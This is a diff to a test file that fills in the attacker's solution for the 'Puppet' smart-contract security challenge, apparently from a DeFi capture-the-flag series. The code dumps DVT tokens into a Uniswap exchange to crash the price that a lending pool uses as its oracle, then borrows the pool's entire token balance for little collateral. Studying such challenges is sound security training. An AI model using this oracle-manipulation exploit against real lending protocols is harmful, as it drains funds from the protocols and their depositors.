@@ -104,40 +104,46 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        let ERC20ToSell = ethers.utils.parseEther('1');
+
+        // Cannot sell all my DVT because of the last requirement of the challenge
+        let DvtToSell = ethers.utils.parseEther('999');
         let value = await this.uniswapExchange.getEthToTokenInputPrice(
-            ERC20ToSell,
+            DvtToSell,
             { gasLimit: 1e6 }
         )
 
-        for (let i=0; i<10; i++) {
+        console.log("DVT/ETH before: " + ethers.utils.formatEther(value));
 
-            console.log("ERC20/ETH before: " + ethers.utils.formatEther(value));
+        await this.token.connect(attacker)
+        .approve(
+            this.uniswapExchange.address,
+            DvtToSell.add(ethers.BigNumber.from("1")),
+        )
 
-            await this.token.connect(attacker)
-            .approve(
-                this.uniswapExchange.address,
-                ERC20ToSell,
-            )
+        let blockTimestamp = (await ethers.provider.getBlock("latest")).timestamp
+        await this.uniswapExchange.connect(attacker)
+        .tokenToEthSwapInput(
+            DvtToSell,
+            ethers.utils.parseEther('0.1'), //min price
+            blockTimestamp*2, //1 week
+        )
+            console.log("sold "+ ethers.utils.formatEther(DvtToSell)+ " DVT");
 
-            let blockTimestamp = (await ethers.provider.getBlock("latest")).timestamp
-            await this.uniswapExchange.connect(attacker)
-            .tokenToEthSwapInput(
-                ERC20ToSell,
-                ethers.utils.parseEther('0.1'), //min price
-                blockTimestamp*2, //1 week
-            )
+        console.log("DVT PoolBalance: " +  ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)))
+        console.log("ETH PoolBalance: " +  ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)))
 
-            console.log("ERC20PoolBalance: " +  ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)))
-            console.log("ETHPoolBalance: " +  ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)))
-
-            value = await this.uniswapExchange.getEthToTokenInputPrice(
-                ERC20ToSell,
-                { gasLimit: 1e6 }
-            )
-            console.log("ERC20/ETH after: " + ethers.utils.formatEther(value) + "\n===============");
-        }
+        value = await this.uniswapExchange.getEthToTokenInputPrice(
+            DvtToSell,
+            { gasLimit: 1e6 }
+        )
+        console.log("DVT/ETH after: " + ethers.utils.formatEther(value) + "\n===============");
         
+        
+        await this.lendingPool.connect(attacker)
+        .borrow(
+            POOL_INITIAL_TOKEN_BALANCE,
+            { value: ethers.utils.parseEther('20'), gasLimit: 1e6}
+            )
 
     });
 
